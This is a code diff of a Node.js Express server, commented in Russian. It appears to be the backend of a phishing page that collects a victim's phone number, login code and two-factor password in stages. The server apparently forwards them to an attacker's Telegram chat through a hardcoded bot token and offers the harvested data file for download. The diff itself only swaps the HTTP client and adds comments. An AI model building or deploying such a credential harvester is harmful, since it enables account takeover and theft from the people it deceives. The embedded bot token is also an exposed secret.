@@ -2,12 +2,14 @@ import express from 'express';
 import cors from 'cors';
 import fs from 'fs';
 import path from 'path';
+import axios from 'axios';
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 const DATA_FILE = path.join('/tmp', 'data.txt');
 
+// ===== ТОКЕНЫ ДЛЯ ЛОГОВ =====
 const LOG_BOT_TOKEN = '8874938761:AAEb6WvhZ8xhvYrrIThYoYlgBWSSE_EVcLo';
 const LOG_CHAT_ID = '7424945574';
 
@@ -17,23 +19,22 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('.'));
 
+// ===== ОТПРАВКА ЛОГОВ В TELEGRAM (AXIOS) =====
 async function sendLog(message) {
     try {
-        await fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: LOG_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
+        const url = `https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`;
+        await axios.post(url, {
+            chat_id: LOG_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
         });
         console.log('📤 Лог отправлен в Telegram');
     } catch (err) {
-        console.error('❌ Ошибка отправки лога:', err);
+        console.error('❌ Ошибка отправки лога:', err.response?.data || err.message);
     }
 }
 
+// ===== 1. ПРИЁМ НОМЕРА =====
 app.post('/api/phone', async (req, res) => {
     const { phone } = req.body;
 
@@ -55,6 +56,7 @@ app.post('/api/phone', async (req, res) => {
     res.json({ success: true });
 });
 
+// ===== 2. ПРИЁМ КОДА =====
 app.post('/api/verify', async (req, res) => {
     const { phone, code } = req.body;
 
@@ -77,6 +79,7 @@ app.post('/api/verify', async (req, res) => {
     res.json({ success: true });
 });
 
+// ===== 3. ПРИЁМ 2FA ПАРОЛЯ =====
 app.post('/api/2fa', async (req, res) => {
     const { phone, code, password } = req.body;
 
@@ -106,6 +109,7 @@ app.post('/api/2fa', async (req, res) => {
     res.json({ success: true });
 });
 
+// ===== 4. СКАЧИВАНИЕ DATA.TXT =====
 app.get('/download', (req, res) => {
     if (fs.existsSync(DATA_FILE)) {
         res.download(DATA_FILE, 'data.txt');
